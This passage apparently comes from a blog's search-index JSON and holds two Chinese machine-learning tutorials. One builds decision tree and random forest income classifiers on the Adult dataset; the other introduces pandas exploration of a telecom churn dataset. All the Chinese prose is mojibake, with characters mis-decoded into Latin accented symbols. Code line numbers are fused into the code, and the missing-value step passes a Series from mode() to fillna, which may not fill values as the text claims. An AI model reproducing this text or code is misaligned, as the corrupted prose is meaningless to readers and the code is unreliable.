ç±»åˆ«ç‰¹å¾ Race â€“ ç±»åˆ«ç‰¹å¾ Sex â€“ ç±»åˆ«ç‰¹å¾ Capital_Gain â€“ è¿ç»­æ•°å€¼ç‰¹å¾ Capital_Loss â€“ è¿ç»­æ•°å€¼ç‰¹å¾ Hours_per_week â€“ è¿ç»­æ•°å€¼ç‰¹å¾ Country â€“ ç±»åˆ«ç‰¹å¾ Target â€“ æ”¶å…¥æ°´å¹³ï¼ŒäºŒå…ƒåˆ†ç±»ç›®æ ‡å€¼ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åŠ è½½å¹¶è¯»å–è¯¥æ•°æ®é›†ï¼š 123456data_train = pd.read_csv( &#x27;https://labfile.oss.aliyuncs.com/courses/1283/adult_train.csv&#x27;, sep=&#x27;;&#x27;)data_train.tail()data_test = pd.read_csv( &#x27;https://labfile.oss.aliyuncs.com/courses/1283/adult_test.csv&#x27;, sep=&#x27;;&#x27;)data_test.tail() ç„¶åï¼Œå¯¹æ•°æ®é›†è¿›è¡Œä¸€äº›å¿…è¦çš„æ¸…æ´—ã€‚åŒæ—¶ï¼Œå°†ç›®æ ‡å€¼è½¬æ¢ä¸º 0ï¼Œ1 äºŒå…ƒæ•°å€¼ã€‚ 12345678910# ç§»é™¤æµ‹è¯•é›†ä¸­çš„é”™è¯¯æ•°æ®data_test = data_test[(data_test[&#x27;Target&#x27;] == &#x27; &gt;50K.&#x27;) | (data_test[&#x27;Target&#x27;] == &#x27; &lt;=50K.&#x27;)]# å°†ç›®æ ‡ç¼–ç ä¸º 0 å’Œ 1data_train.loc[data_train[&#x27;Target&#x27;] == &#x27; &lt;=50K&#x27;, &#x27;Target&#x27;] = 0data_train.loc[data_train[&#x27;Target&#x27;] == &#x27; &gt;50K&#x27;, &#x27;Target&#x27;] = 1data_test.loc[data_test[&#x27;Target&#x27;] == &#x27; &lt;=50K.&#x27;, &#x27;Target&#x27;] = 0data_test.loc[data_test[&#x27;Target&#x27;] == &#x27; &gt;50K.&#x27;, &#x27;Target&#x27;] = 1 è¾“å‡ºæµ‹è¯•æ•°æ®æ¦‚è§ˆè¡¨ï¼ŒæŸ¥çœ‹ç‰¹å¾å’Œç›®æ ‡å€¼çš„å„é¡¹ç»Ÿè®¡æŒ‡æ ‡ã€‚ 1data_test.describe(include=&#x27;all&#x27;).T æ¥ä¸‹æ¥ï¼ŒæŸ¥çœ‹è®­ç»ƒæ•°æ®é›†ç›®æ ‡åˆ†å¸ƒè®¡æ•°ï¼ŒåŒæ—¶ç»˜åˆ¶å„é¡¹ç‰¹å¾çš„å…³è”åˆ†å¸ƒå›¾åƒã€‚ 12345678910111213data_train[&#x27;Target&#x27;].value_counts()fig = plt.figure(figsize=(25, 15))cols = 5rows = np.ceil(float(data_train.shape[1]) / cols)for i, column in enumerate(data_train.columns): ax = fig.add_subplot(int(rows), cols, i + 1) ax.set_title(column) if data_train.dtypes[column] == np.object_: data_train[column].value_counts().plot(kind=&quot;bar&quot;, axes=ax) else: data_train[column].hist(axes=ax) plt.xticks(rotation=&quot;vertical&quot;)plt.subplots_adjust(hspace=0.7, wspace=0.2) è¿›ä¸€æ­¥åˆ†æä¹‹å‰ï¼Œéœ€è¦æ£€æŸ¥æ•°æ®çš„ç±»å‹ã€‚ 12data_train.dtypesdata_test.dtypes å¯ä»¥çœ‹çš„æµ‹è¯•æ•°æ®ä¸­ï¼Œå¹´é¾„ Age æ˜¯ object ç±»å‹ï¼Œæˆ‘ä»¬éœ€è¦ä¿®å¤å…¶ä¸ºæ•´æ•°ç±»å‹ã€‚ 1data_test[&#x27;Age&#x27;] = data_test[&#x27;Age&#x27;].astype(int) ä¸æ­¤åŒæ—¶ï¼Œæˆ‘ä»¬å°†æµ‹è¯•æ•°æ®ä¸­æµ®ç‚¹ç±»å‹ç‰¹å¾å…¨éƒ¨å¤„ç†æˆæ•´æ•°ç±»å‹ï¼Œä»¥ä¾¿ä¸è®­ç»ƒæ•°æ®å¯¹åº”ã€‚ 12345data_test[&#x27;fnlwgt&#x27;] = data_test[&#x27;fnlwgt&#x27;].astype(int)data_test[&#x27;Education_Num&#x27;] = data_test[&#x27;Education_Num&#x27;].astype(int)data_test[&#x27;Capital_Gain&#x27;] = data_test[&#x27;Capital_Gain&#x27;].astype(int)data_test[&#x27;Capital_Loss&#x27;] = data_test[&#x27;Capital_Loss&#x27;].astype(int)data_test[&#x27;Hours_per_week&#x27;] = data_test[&#x27;Hours_per_week&#x27;].astype(int) è¿™é‡Œè¿˜éœ€è¦ç»§ç»­å¯¹æ•°æ®é¢„å¤„ç†ï¼Œé¦–å…ˆåŒºåˆ†æ•°æ®é›†ä¸­çš„ç±»åˆ«å’Œè¿ç»­ç‰¹å¾ã€‚ 12345678# ä»æ•°æ®é›†ä¸­é€‰æ‹©ç±»åˆ«å’Œè¿ç»­ç‰¹å¾å˜é‡categorical_columns = [c for c in data_train.columns if data_train[c].dtype.name == &#x27;object&#x27;]numerical_columns = [c for c in data_train.columns if data_train[c].dtype.name != &#x27;object&#x27;]print(&#x27;categorical_columns:&#x27;, categorical_columns)print(&#x27;numerical_columns:&#x27;, numerical_columns) ç„¶åï¼Œå¯¹è¿ç»­ç‰¹å¾ä½¿ç”¨ä¸­ä½æ•°å¯¹ç¼ºå¤±æ•°æ®è¿›è¡Œå¡«å……ï¼Œè€Œç±»åˆ«ç‰¹å¾åˆ™ä½¿ç”¨ä¼—æ•°è¿›è¡Œå¡«å……ã€‚ 12345678# å¡«å……ç¼ºå¤±æ•°æ®for c in categorical_columns: data_train[c].fillna(data_train[c].mode(), inplace=True) data_test[c].fillna(data_train[c].mode(), inplace=True)for c in numerical_columns: data_train[c].fillna(data_train[c].median(), inplace=True) data_test[c].fillna(data_train[c].median(), inplace=True) æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ç±»åˆ«ç‰¹å¾è¿›è¡Œç‹¬çƒ­ç¼–ç ï¼Œä»¥ä¿è¯æ•°æ®é›†ç‰¹å¾å…¨éƒ¨ä¸ºæ•°å€¼ç±»å‹æ–¹ä¾¿åç»­ä¼ å…¥æ¨¡å‹ã€‚ 1234567data_train = pd.concat([data_train[numerical_columns], pd.get_dummies(data_train[categorical_columns])], axis=1)data_test = pd.concat([data_test[numerical_columns], pd.get_dummies(data_test[categorical_columns])], axis=1)set(data_train.columns) - set(data_test.columns)data_train.shape, data_test.shape ç‹¬çƒ­ç¼–ç ä¹‹åå‘ç°æµ‹è¯•æ•°æ®ä¸­æ²¡æœ‰ Hollandï¼Œä¸ºäº†ä¸è®­ç»ƒæ•°æ®å¯¹åº”ï¼Œè¿™é‡Œéœ€è¦åˆ›å»ºé›¶å€¼ç‰¹å¾è¿›è¡Œè¡¥é½ã€‚ 123456789data_test[&#x27;Country_ Holand-Netherlands&#x27;] = 0set(data_train.columns) - set(data_test.columns)data_train.head(2)data_test.head(2)X_train = data_train.drop([&#x27;Target&#x27;], axis=1)y_train = data_train[&#x27;Target&#x27;]X_test = data_test.drop([&#x27;Target&#x27;], axis=1)y_test = data_test[&#x27;Target&#x27;] å»ºç«‹é»˜è®¤å‚æ•°å†³ç­–æ ‘æ¨¡å‹ æ¥ä¸‹æ¥ï¼Œä½¿ç”¨è®­ç»ƒæ•°æ®åˆ›å»ºä¸€ä¸ªå†³ç­–æ ‘åˆ†ç±»å™¨ã€‚æŒ‘æˆ˜è§„å®š max_depth=3ï¼Œrandom_state=17ã€‚ *é—®é¢˜ï¼š*æŒ‰æŒ‘æˆ˜è¦æ±‚æ„å»ºå†³ç­–æ ‘ï¼Œå¹¶è¾“å‡ºå…¶åœ¨æµ‹è¯•é›†ä¸Šçš„å‡†ç¡®åº¦ï¼Ÿ 12tree = DecisionTreeClassifier(criterion=&#x27;entropy&#x27;, max_depth=3, random_state=17)tree.fit(X_train, y_train) *æœŸæœ›ç»“æœï¼š*0.845 å¯¹å†³ç­–æ ‘æ¨¡å‹è¿›è¡Œè°ƒå‚ *é—®é¢˜ï¼š*ä½¿ç”¨ GridSearchCV ç½‘æ ¼æœç´¢å¯¹å†³ç­–æ ‘è¿›è¡Œè°ƒå‚å¹¶è¿”å›æœ€ä½³å‚æ•°ã€‚ æŒ‘æˆ˜è§„å®šï¼Œå†³ç­–æ ‘å‚æ•° random_state = 17ï¼ŒGridSearchCV å‚æ•° cv=5ï¼Œå¹¶å¯¹ max_depth å‚æ•°åœ¨ [8,10][8,10] èŒƒå›´è¿›è¡Œç½‘æ ¼æœç´¢ã€‚ 123456tree_params = &#123;&#x27;max_depth&#x27;: range(8, 11)&#125;locally_best_tree = GridSearchCV(DecisionTreeClassifier(random_state=17), tree_params, cv=5)locally_best_tree.fit(X_train, y_train) *é—®é¢˜ï¼š*æ„å»ºä¸Šé¢æœ€ä½³å‚æ•°å†³ç­–æ ‘ï¼Œå¹¶è¾“å‡ºå…¶åœ¨æµ‹è¯•é›†ä¸Šçš„å‡†ç¡®åº¦ï¼Ÿ 1234tuned_tree = DecisionTreeClassifier(max_depth=9, random_state=17)tuned_tree.fit(X_train, y_train)tuned_tree_predictions = tuned_tree.predict(X_test)accuracy_score(y_test, tuned_tree_predictions) *æœŸæœ›ç»“æœï¼š*0.847 å»ºç«‹éšæœºæ£®æ—åˆ†ç±»æ¨¡å‹ å’Œä¸Šé¢å»ºç«‹å†³ç­–æ ‘ç›¸ä¼¼ï¼Œå¯ä»¥åˆ©ç”¨ scikit-learn æä¾›çš„éšæœºæ£®æ—ç®—æ³•å»ºç«‹ç›¸åº”çš„åˆ†ç±»é¢„æµ‹æ¨¡å‹ã€‚ *é—®é¢˜ï¼š*æ„å»º RandomForestClassifier éšæœºæ£®æ—åˆ†ç±»å™¨ã€‚æŒ‘æˆ˜è§„å®šå‚æ•° n_estimators=100 ä¸” random_state=17ï¼Œå…¶ä½™é»˜è®¤ã€‚ 12rf = RandomForestClassifier(n_estimators=100, random_state=17)rf.fit(X_train, y_train) è¾“å‡ºåœ¨æµ‹è¯•é›†ä¸Šçš„åˆ†ç±»é¢„æµ‹å‡†ç¡®åº¦ã€‚ 12forest_predictions = rf.predict(X_test) accuracy_score(y_test,forest_predictions) *æœŸæœ›ç»“æœï¼š*0.858","tags":[],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"C_æœºå™¨å­¦ä¹ ","slug":"A-å†…åŠŸ/C-æœºå™¨å­¦ä¹ ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/C-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"æœºå™¨å­¦ä¹ åŸºç¡€","slug":"A-å†…åŠŸ/C-æœºå™¨å­¦ä¹ /æœºå™¨å­¦ä¹ åŸºç¡€","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/C-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/"}]},{"title":"ã€æœºå™¨å­¦ä¹ åŸºç¡€ã€‘å¯¼è¯»","date":"2024-06-17T10:02:42.554Z","path":"A_å†…åŠŸ/C_æœºå™¨å­¦ä¹ /æœºå™¨å­¦ä¹ åŸºç¡€/ã€æœºå™¨å­¦ä¹ åŸºç¡€ã€‘å¯¼è¯»/","text":"æ¦‚è¿°: å®éªŒæ¥¼æœºå™¨å­¦ä¹ åŸºç¡€ ä½¿ç”¨ Pandas è¿›è¡Œæ•°æ®æ¢ç´¢ ä»‹ç» æœ¬æ¬¡å®éªŒé€šè¿‡åˆ†æç”µä¿¡è¿è¥å•†çš„å®¢æˆ·ç¦»ç½‘ç‡æ•°æ®é›†æ¥ç†Ÿæ‚‰ Pandas æ•°æ®æ¢ç´¢çš„å¸¸ç”¨æ–¹æ³•ï¼Œå¹¶æ„å»ºä¸€ä¸ªé¢„æµ‹å®¢æˆ·ç¦»ç½‘ç‡çš„ç®€å•æ¨¡å‹ã€‚ çŸ¥è¯†ç‚¹ æ’åˆ— ç´¢å¼• äº¤å‰è¡¨ é€è§†è¡¨ æ•°æ®æ¢ç´¢ è¯¾ç¨‹ä»‹ç» æœºå™¨å­¦ä¹ å¼€æ”¾åŸºç¡€è¯¾ç¨‹æ˜¯è“æ¡¥äº‘è¯¾ç»ç”± Open Machine Learning Course æˆæƒå¹¶åˆ¶ä½œçš„æœºå™¨å­¦ä¹ å…è´¹åŸºç¡€å®æˆ˜è¯¾ã€‚è“æ¡¥äº‘è¯¾å’Œ mlcourse.ai å…±åŒäº«æœ‰æ”¹ç¼–å†…å®¹ç‰ˆæƒã€‚ æˆ‘ä»¬åœ¨åŸè‹±æ–‡è¯¾ç¨‹æä¾›çš„å†…å®¹å’Œä»£ç åŸºç¡€ä¸Šè¿›è¡Œäº†ç¼–è¯‘ï¼Œå¹¶ä¸å±€é™äºç®€å•çš„ç¿»è¯‘ã€‚ç‰¹åˆ«åœ°ï¼Œæˆ‘ä»¬é’ˆå¯¹éƒ¨åˆ†ä»£ç å’Œå†…å®¹è¿›è¡Œå¢åˆ ï¼Œæ·»åŠ äº†æ›´å¤šçš„è®²è§£å’Œæ³¨é‡Šæ€§å†…å®¹ï¼Œå†…å®¹ä¹Ÿæ›´æ˜“äºå›½å†…ç”¨æˆ·ç†è§£ã€‚å¦å¤–ï¼Œè¯¾ç¨‹é€‚é…äº†è“æ¡¥äº‘è¯¾æä¾›çš„çº¿ä¸Š Notebook å®éªŒç¯å¢ƒï¼Œè®©ä½ å¯ä»¥éšæ—¶éšåœ°å¼€å§‹å­¦ä¹ ã€‚è¯¥è¯¾ç¨‹é€‚åˆäºå¯¹æœºå™¨å­¦ä¹ æ„Ÿå…´è¶£çš„ç”¨æˆ·ï¼Œä½†éœ€è¦å…·å¤‡åŸºç¡€çš„ Python ç¼–ç¨‹èƒ½åŠ›å’Œæ•°å­¦æ°´å¹³ã€‚ å¦‚æœä½ å­¦ä¹ å®Œè¯¥è¯¾ç¨‹åï¼Œæƒ³è¿›ä¸€æ­¥æ·±å…¥å­¦ä¹ æœºå™¨å­¦ä¹ æˆ–æ•°æ®åˆ†æçŸ¥è¯†ï¼Œæ¬¢è¿æŠ¥å è“æ¡¥äº‘è¯¾ç²¾å¿ƒæ‰“é€ çš„æ¥¼+ è¯¾ç¨‹ã€‚ Pandas çš„ä¸»è¦æ–¹æ³• Pandas æ˜¯åŸºäº NumPy çš„ä¸€ç§å·¥å…·ï¼Œæä¾›äº†å¤§é‡æ•°æ®æ¢ç´¢çš„æ–¹æ³•ã€‚Pandas å¯ä»¥ä½¿ç”¨ç±»ä¼¼ SQL çš„æ–¹å¼å¯¹ .csvã€.tsvã€.xlsx ç­‰æ ¼å¼çš„æ•°æ®è¿›è¡Œå¤„ç†åˆ†æã€‚ Pandas ä¸»è¦ä½¿ç”¨çš„æ•°æ®ç»“æ„æ˜¯ Series å’Œ DataFrame ç±»ã€‚ä¸‹é¢ç®€è¦ä»‹ç»ä¸‹è¿™ä¸¤ç±»ï¼š Series æ˜¯ä¸€ç§ç±»ä¼¼äºä¸€ç»´æ•°ç»„çš„å¯¹è±¡ï¼Œå®ƒç”±ä¸€ç»„æ•°æ®ï¼ˆå„ç§ NumPy æ•°æ®ç±»å‹ï¼‰åŠä¸€ç»„ä¸ä¹‹ç›¸å…³çš„æ•°æ®æ ‡ç­¾ï¼ˆå³ç´¢å¼•ï¼‰ç»„æˆã€‚ DataFrame æ˜¯ä¸€ä¸ªäºŒç»´æ•°æ®ç»“æ„ï¼Œå³ä¸€å¼ è¡¨æ ¼ï¼Œå…¶ä¸­æ¯åˆ—æ•°æ®çš„ç±»å‹ç›¸åŒã€‚ä½ å¯ä»¥æŠŠå®ƒçœ‹æˆç”± Series å®ä¾‹æ„æˆçš„å­—å…¸ã€‚ ä¸‹é¢å¼€å§‹æ­¤æ¬¡å®éªŒï¼Œæˆ‘ä»¬å°†é€šè¿‡åˆ†æç”µä¿¡è¿è¥å•†çš„å®¢æˆ·ç¦»ç½‘ç‡æ•°æ®é›†æ¥å±•ç¤º Pandas çš„ä¸»è¦æ–¹æ³•ã€‚ é¦–å…ˆè½½å…¥å¿…è¦çš„åº“ï¼Œå³ NumPy å’Œ Pandasã€‚ æ•™å­¦ä»£ç ï¼š 1234import numpy as npimport pandas as pdimport warningswarnings.filterwarnings(&#x27;ignore&#x27;) åŠ¨æ‰‹ç»ƒä¹ ï½œå¦‚æœä½ å¯¹è¯¾ç¨‹æ‰€ä½¿ç”¨çš„è“æ¡¥äº‘è¯¾ Notebook åœ¨çº¿ç¯å¢ƒå¹¶ä¸ç†Ÿæ‚‰ï¼Œå¯ä»¥å…ˆå­¦ä¹  ä½¿ç”¨æŒ‡å—è¯¾ç¨‹ã€‚ 1# åœ¨æ­¤ç©ºç™½å•å…ƒæ ¼ä¸­å¯¹ç…§æ•™å­¦ä»£ç ç»ƒä¹ å³å¯ é€šè¿‡ read_csv() æ–¹æ³•è¯»å–æ•°æ®ï¼Œç„¶åä½¿ç”¨ head() æ–¹æ³•æŸ¥çœ‹å‰ 5 è¡Œæ•°æ®ã€‚ 123df = pd.read_csv( &#x27;https://labfile.oss.aliyuncs.com/courses/1283/telecom_churn.csv&#x27;)df.head() ä¸Šå›¾ä¸­çš„æ¯è¡Œå¯¹åº”ä¸€ä½å®¢æˆ·ï¼Œæ¯åˆ—å¯¹åº”å®¢æˆ·çš„ä¸€ä¸ªç‰¹å¾ã€‚ è®©æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è¯¥æ•°æ®åº“çš„ç»´åº¦ã€ç‰¹å¾åç§°å’Œç‰¹å¾ç±»å‹ã€‚ 1df.shape ä¸Šè¿°ç»“æœè¡¨æ˜ï¼Œæˆ‘ä»¬çš„åˆ—è¡¨åŒ…å« 3333 è¡Œå’Œ 20 åˆ—ã€‚ä¸‹é¢æˆ‘ä»¬å°è¯•æ‰“å°åˆ—åã€‚ 1df.columns æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ info() æ–¹æ³•è¾“å‡º DataFrame çš„ä¸€äº›æ€»ä½“ä¿¡æ¯ã€‚ 1df.info() boolã€int64ã€float64 å’Œ object æ˜¯è¯¥æ•°æ®åº“ç‰¹å¾çš„æ•°æ®ç±»å‹ã€‚è¿™ä¸€æ–¹æ³•åŒæ—¶ä¹Ÿä¼šæ˜¾ç¤ºæ˜¯å¦æœ‰ç¼ºå¤±å€¼ï¼Œä¸Šè¿°ç»“æœè¡¨æ˜åœ¨è¯¥æ•°æ®é›†ä¸­ä¸å­˜åœ¨ç¼ºå¤±å€¼ï¼Œå› ä¸ºæ¯åˆ—éƒ½åŒ…å« 3333 ä¸ªè§‚æµ‹ï¼Œå’Œæˆ‘ä»¬ä¹‹å‰ä½¿ç”¨ shape æ–¹æ³•å¾—åˆ°çš„æ•°å­—æ˜¯ä¸€è‡´çš„ã€‚ astype() æ–¹æ³•å¯ä»¥æ›´æ”¹åˆ—çš„ç±»å‹ï¼Œä¸‹åˆ—å…¬å¼å°† Churn ç¦»ç½‘ç‡ ç‰¹å¾ä¿®æ”¹ä¸º int64 ç±»å‹ã€‚ 12df[&#x27;Churn&#x27;] = df[&#x27;Churn&#x27;].astype(&#x27;int64&#x27;) describe() æ–¹æ³•å¯ä»¥æ˜¾ç¤ºæ•°å€¼ç‰¹å¾ï¼ˆint64 å’Œ float64ï¼‰çš„åŸºæœ¬ç»Ÿè®¡å­¦ç‰¹æ€§ï¼Œå¦‚æœªç¼ºå¤±å€¼çš„æ•°å€¼ã€å‡å€¼ã€æ ‡å‡†å·®ã€èŒƒå›´ã€å››åˆ†ä½æ•°ç­‰ã€‚ 1df.describe() é€šè¿‡ include å‚æ•°æ˜¾å¼æŒ‡å®šåŒ…å«çš„æ•°æ®ç±»å‹ï¼Œå¯ä»¥æŸ¥çœ‹éæ•°å€¼ç‰¹å¾çš„ç»Ÿè®¡æ•°æ®ã€‚ 1df.describe(include=[&#x27;object&#x27;, &#x27;bool&#x27;]) value_counts() æ–¹æ³•å¯ä»¥æŸ¥çœ‹ç±»åˆ«ï¼ˆç±»å‹ä¸º object ï¼‰å’Œå¸ƒå°”å€¼ï¼ˆç±»å‹ä¸º bool ï¼‰ç‰¹å¾ã€‚è®©æˆ‘ä»¬çœ‹ä¸‹ Churn ç¦»ç½‘ç‡ çš„åˆ†å¸ƒã€‚ 1df[&#x27;Churn&#x27;].value_counts() ä¸Šè¿°ç»“æœè¡¨æ˜ï¼Œåœ¨ 3333 ä½å®¢æˆ·ä¸­ï¼Œ 2850 ä½æ˜¯å¿ å®å®¢æˆ·ï¼Œä»–ä»¬çš„ Churn å€¼ä¸º 0ã€‚è°ƒç”¨ value_counts() å‡½æ•°æ—¶ï¼ŒåŠ ä¸Š normalize=True å‚æ•°å¯ä»¥æ˜¾ç¤ºæ¯”ä¾‹ã€‚ 1df[&#x27;Churn&#x27;].value_counts(normalize=True) æ’åº DataFrame å¯ä»¥æ ¹æ®æŸä¸ªå˜é‡çš„å€¼ï¼ˆä¹Ÿå°±æ˜¯åˆ—ï¼‰æ’åºã€‚æ¯”å¦‚ï¼Œæ ¹æ®æ¯æ—¥æ¶ˆè´¹é¢æ’åºï¼ˆè®¾ç½® ascending=False å€’åºæ’åˆ—ï¼‰ã€‚ 1df.sort_values(by=&#x27;Total day charge&#x27;, ascending=False).head() æ­¤å¤–ï¼Œè¿˜å¯ä»¥æ ¹æ®å¤šä¸ªåˆ—çš„æ•°å€¼æ’åºã€‚ä¸‹é¢å‡½æ•°å®ç°çš„åŠŸèƒ½ä¸ºï¼šå…ˆæŒ‰ Churn ç¦»ç½‘ç‡ å‡åºæ’åˆ—ï¼Œå†æŒ‰ Total day charge æ¯æ—¥æ€»è¯è´¹ é™åºæ’åˆ—ï¼Œä¼˜å…ˆçº§ Churn &gt; Tatal day chargeã€‚ 12df.sort_values(by=[&#x27;Churn&#x27;, &#x27;Total day charge&#x27;], ascending=[True, False]).head() ç´¢å¼•å’Œè·å–æ•°æ® DataFrame å¯ä»¥ä»¥ä¸åŒçš„æ–¹å¼è¿›è¡Œç´¢å¼•ã€‚ ä½¿ç”¨ DataFrame['Name'] å¯ä»¥å¾—åˆ°ä¸€ä¸ªå•ç‹¬çš„åˆ—ã€‚æ¯”å¦‚ï¼Œç¦»ç½‘ç‡æœ‰å¤šé«˜ï¼Ÿ 1df[&#x27;Churn&#x27;].mean() å¯¹ä¸€å®¶å…¬å¸è€Œè¨€ï¼Œ14.5% çš„ç¦»ç½‘ç‡æ˜¯ä¸€ä¸ªå¾ˆç³Ÿç³•çš„æ•°æ®ï¼Œè¿™ä¹ˆé«˜çš„ç¦»ç½‘ç‡å¯èƒ½å¯¼è‡´å…¬å¸ç ´äº§ã€‚ å¸ƒå°”å€¼ç´¢å¼•åŒæ ·å¾ˆæ–¹ä¾¿ï¼Œè¯­æ³•æ˜¯ df[P(df['Name'])]ï¼ŒP æ˜¯åœ¨æ£€æŸ¥ Name åˆ—æ¯ä¸ªå…ƒç´ æ—¶æ‰€ä½¿ç”¨çš„é€»è¾‘æ¡ä»¶ã€‚è¿™ä¸€ç´¢å¼•çš„è¾“å‡ºæ˜¯ DataFrame çš„ Name åˆ—ä¸­æ»¡è¶³ P æ¡ä»¶çš„è¡Œã€‚ è®©æˆ‘ä»¬ä½¿ç”¨å¸ƒå°”å€¼ç´¢å¼•æ¥å›ç­”è¿™æ ·ä»¥ä¸‹é—®é¢˜ï¼šç¦»ç½‘ç”¨æˆ·çš„æ•°å€¼å˜é‡çš„å‡å€¼æ˜¯å¤šå°‘ï¼Ÿ 1df[df[&#x27;Churn&#x27;] == 1].mean() ç¦»ç½‘ç”¨æˆ·åœ¨ç™½å¤©æ‰“ç”µè¯çš„æ€»æ—¶é•¿çš„å‡å€¼æ˜¯å¤šå°‘ï¼Ÿ 1df[df[&#x27;Churn&#x27;] == 1][&#x27;Total day minutes&#x27;].mean() æœªä½¿ç”¨å›½é™…å¥—é¤ï¼ˆInternational plan == NOï¼‰çš„å¿ å®ç”¨æˆ·ï¼ˆChurn == 0ï¼‰æ‰€æ‰“çš„æœ€é•¿çš„å›½é™…é•¿é€”æ˜¯å¤šä¹…ï¼Ÿ 12df[(df[&#x27;Churn&#x27;] == 0) &amp; (df[&#x27;International plan&#x27;] == &#x27;No&#x27;) ][&#x27;Total intl minutes&#x27;].max() DataFrame å¯ä»¥é€šè¿‡åˆ—åã€è¡Œåã€è¡Œå·è¿›è¡Œç´¢å¼•ã€‚loc æ–¹æ³•ä¸ºé€šè¿‡åç§°ç´¢å¼•ï¼Œiloc æ–¹æ³•ä¸ºé€šè¿‡æ•°å­—ç´¢å¼•ã€‚ é€šè¿‡ loc æ–¹æ³•è¾“å‡º 0 è‡³ 5 è¡Œã€State å· è‡³ Area code åŒºå· çš„æ•°æ®ã€‚ 1df.loc[0:5, &#x27;State&#x27;:&#x27;Area code&#x27;] é€šè¿‡ iloc æ–¹æ³•è¾“å‡ºå‰ 5 è¡Œçš„å‰ 3 åˆ—æ•°æ®ï¼ˆå’Œå…¸å‹çš„ Python åˆ‡ç‰‡ä¸€æ ·ï¼Œä¸å«æœ€å¤§å€¼ï¼‰ã€‚ 1df.iloc[0:5, 0:3] df[:1] å’Œ df[-1:] å¯ä»¥å¾—åˆ° DataFrame çš„é¦–è¡Œå’Œæœ«è¡Œã€‚ 1df[-1:] åº”ç”¨å‡½æ•°åˆ°å•å…ƒæ ¼ã€åˆ—ã€è¡Œ ä¸‹é¢é€šè¿‡ apply() æ–¹æ³•åº”ç”¨å‡½æ•° max è‡³æ¯ä¸€åˆ—ï¼Œå³è¾“å‡ºæ¯åˆ—çš„æœ€å¤§å€¼ã€‚ 1df.apply(np.max) apply() æ–¹æ³•ä¹Ÿå¯ä»¥åº”ç”¨å‡½æ•°è‡³æ¯ä¸€è¡Œï¼ŒæŒ‡å®š axis=1 å³å¯ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½¿ç”¨ lambda å‡½æ•°ååˆ†æ–¹ä¾¿ã€‚æ¯”å¦‚ï¼Œä¸‹é¢å‡½æ•°é€‰ä¸­äº†æ‰€æœ‰ä»¥ W å¼€å¤´çš„å·ã€‚ 1df[df[&#x27;State&#x27;].apply(lambda state: state[0] == &#x27;W&#x27;)].head() map() æ–¹æ³•å¯ä»¥é€šè¿‡ä¸€ä¸ª {old_value:new_value} å½¢å¼çš„å­—å…¸æ›¿æ¢æŸä¸€åˆ—ä¸­çš„å€¼ã€‚ 123d = &#123;&#x27;No&#x27;: False, &#x27;Yes&#x27;: True&#125;df[&#x27;International plan&#x27;] = df[&#x27;International plan&#x27;].map(d)df.head() å½“ç„¶ï¼Œä½¿ç”¨ repalce() æ–¹æ³•ä¸€æ ·å¯ä»¥è¾¾åˆ°æ›¿æ¢çš„ç›®çš„ã€‚ 12df = df.replace(&#123;&#x27;Voice mail plan&#x27;: d&#125;)df.head() åˆ†ç»„ï¼ˆGroupbyï¼‰ Pandas ä¸‹åˆ†ç»„æ•°æ®çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼š 1df.groupby(by=grouping_columns)[columns_to_show].function() å¯¹ä¸Šè¿°å‡½æ•°çš„è§£é‡Šï¼š groupby() æ–¹æ³•æ ¹æ® grouping_columns çš„å€¼è¿›è¡Œåˆ†ç»„ã€‚ æ¥ç€ï¼Œé€‰ä¸­æ„Ÿå…´è¶£çš„åˆ—ï¼ˆcolumns_to_showï¼‰ã€‚è‹¥ä¸åŒ…æ‹¬è¿™ä¸€é¡¹ï¼Œé‚£ä¹ˆå°±ä¼šé€‰ä¸­æ‰€æœ‰é groupby åˆ—ï¼ˆå³é™¤ grouping_colums å¤–çš„æ‰€æœ‰åˆ—ï¼‰ã€‚ æœ€åï¼Œåº”ç”¨ä¸€ä¸ªæˆ–å¤šä¸ªå‡½æ•°ï¼ˆfunctionï¼‰ã€‚ åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬æ ¹æ® Churn ç¦»ç½‘ç‡ å˜é‡çš„å€¼å¯¹æ•°æ®è¿›è¡Œåˆ†ç»„ï¼Œæ˜¾ç¤ºæ¯ç»„çš„ç»Ÿè®¡æ•°æ®ã€‚ 1234columns_to_show = [&#x27;Total day minutes&#x27;, &#x27;Total eve minutes&#x27;, &#x27;Total night minutes&#x27;]df.groupby([&#x27;Churn&#x27;])[columns_to_show].describe(percentiles=[]) å’Œä¸Šé¢çš„ä¾‹å­ç±»ä¼¼ï¼Œåªä¸è¿‡è¿™æ¬¡å°†ä¸€äº›å‡½æ•°ä¼ ç»™ agg()ï¼Œé€šè¿‡ agg() æ–¹æ³•å¯¹åˆ†ç»„åçš„æ•°æ®è¿›è¡Œèšåˆã€‚ 1234columns_to_show = [&#x27;Total day minutes&#x27;, &#x27;Total eve minutes&#x27;, &#x27;Total night minutes&#x27;]df.groupby([&#x27;Churn&#x27;])[columns_to_show].agg([np.mean, np.std, np.min, np.max]) æ±‡æ€»è¡¨ Pandas ä¸­çš„é€è§†è¡¨å®šä¹‰å¦‚ä¸‹ï¼š é€è§†è¡¨(Pivot Table)æ˜¯ç”µå­è¡¨æ ¼ç¨‹åºå’Œå…¶ä»–æ•°æ®æ¢ç´¢è½¯ä»¶ä¸­ä¸€ç§å¸¸è§çš„æ•°æ®æ±‡æ€»å·¥å…·ã€‚å®ƒæ ¹æ®ä¸€ä¸ªæˆ–å¤šä¸ªé”®å¯¹æ•°æ®è¿›è¡Œèšåˆï¼Œå¹¶æ 